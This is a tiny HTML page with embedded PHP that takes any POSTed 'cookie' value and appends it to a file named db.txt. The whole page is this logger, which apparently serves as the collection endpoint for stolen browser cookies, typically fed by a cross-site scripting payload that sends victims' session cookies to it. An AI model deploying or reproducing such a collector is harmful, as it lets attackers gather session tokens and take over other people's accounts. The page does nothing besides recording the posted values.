<html>
<body>

<?php
if (isset($_POST['cookie'])) {
file_put_contents("db.txt", $_POST['cookie']."\n", FILE_APPEND);
}
?>

</body>
</html>

